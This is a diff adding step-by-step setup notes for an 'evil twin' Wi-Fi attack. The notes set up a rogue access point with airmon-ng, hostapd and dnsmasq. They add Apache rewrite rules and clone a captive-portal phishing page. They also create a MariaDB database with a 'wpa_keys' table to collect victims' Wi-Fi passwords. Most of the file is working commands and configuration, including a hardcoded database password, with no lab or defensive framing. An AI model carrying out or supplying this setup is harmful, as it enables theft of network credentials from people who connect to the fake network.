@@ -1,0 +1,72 @@
+'''
+wlan0 = ap with internet access
+wlan0mon = fake ap 
+'''
+# CONFIGURE sample ./dnasmq.conf
+# CONFIGURE sample ./hostpad.conf
+
+# CONFIGURE /etc/apache2/sites-enabled/000-default.conf
+# paste underneath /VirtualHost
+>>>
+<Directory "/var/www/html">
+	RewriteEngine On
+	RewriteBase /
+	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+	RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+	
+	RewriteCond %{REQUEST_FILENAME} !-f
+	RewriteCond %{REQUEST_FILENAME} !-d
+	RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+>>>
+# a2enmod rewrite
+
+# cd /var/www/html && git clone https://github.com/athanstan/EvilTwin_AP_CaptivePortal
+# mv ./EvilTwin_AP_CaptivePortal/* ../
+# systemctl restart apache2
+
+# nano /var/www/html/dbconnect.php
+# take note of the table, db names and make sure username and password match local setup
+>>>
+$host="localhost";
+$username="deusxmachina"; //root on windows
+$pass=".0Percent@rw3ifri3nds"; // "" on windows
+$dbname="eviltwin";
+$tbl_name="wpa_keys";
+>>>
+
+# MariaDB MySQL setup 
+# mysql_secure_installation
+# change root password from default(empty), disable root remote login, delete sample
+# \tables and reload privilege tables.
+# mariadb -u root -p
+> create user 'deusxmachina'@'%' identified by '.0Percent@rw3ifri3nds';
+> create database eviltwin;
+> use eviltwin;
+> create table wpa_keys(password1 varchar(32), password2 varchar(32));
+> show columns in wpa_keys;
+> grant all privileges on eviltwin.* to 'deusxmachina'@'%';
+> flush privileges;
+
+> insert into wpa_keys(password1, password2) values ("testpass123", "testpass1234");
+
+# FIREWALL
+# ufw allow 80/tcp # Apache2
+# ufw allow 3306/tcp # MySQL
+
+
+# EXECUTION
+# airmon-ng start wlan0
+# ifconfig wlan0mon up 10.10.0.1 netmask 255.255.255.0 
+
+# ROUTES
+# list all routes on local machine
+# route -n 
+# flush any remaining related routes if there are any
+# ip route flush 10.10.0.0/24
+
+# route add -net 10.10.0.0 netmask 255.255.255.0 gw 10.10.0.1
+# ./iptables.sh
+# hostapd hostapd.conf
+# dnsmasq -C dnsmasq.conf -d
+
